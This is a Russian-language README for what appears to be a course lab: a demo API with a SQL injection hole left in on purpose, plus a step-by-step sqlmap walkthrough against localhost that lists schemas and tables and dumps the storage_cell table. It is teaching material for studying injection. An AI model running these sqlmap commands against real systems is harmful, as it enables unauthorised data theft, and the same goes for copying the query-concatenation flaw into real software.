В данном примере есть api для поиска владельца по имени. Также в этом примере намеренно сделана ошибка безопасности - 
вместо эскейпинга параметра  он добавляется в запрос через конкатенацию. 

Запуск - `docker compose up`

Пример вывода строк из таблицы `storage_cell` через `sqlmap`

1. Нужно преобразовать curl запрос в формат, понятный для `sqlmap`
```shell
curl --location --request POST 'http://127.0.0.1:40230/holders/find_by_name' \
--header 'Content-Type: application/json' \
--data-raw '{
    "name": "Иван Вячеславович"
}'
```

Формат, который понимает sqlmap, следующий:
```
POST /holders/find_by_name HTTP/1.1
Host: http://127.0.0.1:40230

{"name":"*"}
```

Его нужно сохранить в файл `sqlrequest.txt`

Следующие команды нужно выполнять в папке с файлом `sqlrequest.txt`

1. Вывод информации о схемах:
```shell
sqlmap -r sqlrequest.txt -p name --dbs --batch
```
Результат:
```shell
available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public
```

Обратите внимание, на подпись available **databases** - то, что в postgres называется
schema, в sqlmap и других sql базах данных называется database

2. Вывод информации о таблицах:
```shell
sqlmap -r sqlrequest.txt -p name -D public --tables --batch
```

Тут -D это название схемы (базы данных в терминологии sqlmap)

Результата:
```shell
[4 tables]
+---------------------+
| equipment           |
| equipment_to_holder |
| holder              |
| storage_cell        |
+---------------------+
```

3. Вывод информации из таблицы `storage_cell`

```shell
sqlmap -r sqlrequest.txt -p name -D public -T storage_cell --dump --batch
```

Результат:
```shell
+----+-----------+------+----------+
| id | holder_id | code | capacity |
+----+-----------+------+----------+
| 1  | 1         | YU58 | 400      |
| 2  | 2         | NT31 | 800      |
| 3  | 2         | AG22 | 1200     |
| 4  | 3         | TQ66 | 800      |
+----+-----------+------+----------+
```

Пример того, того, как делать инъекции руками, похожий на тот, что был разобран на
семинаре, есть в книге `Kali Linux: библия пентестера`, глава `SQL-инъекция`. Сайт
`mutillidae`, на котором это показывается, можно поднять через docker compose из
[этого репозитория](https://github.com/webpwnized/mutillidae-docker.git).
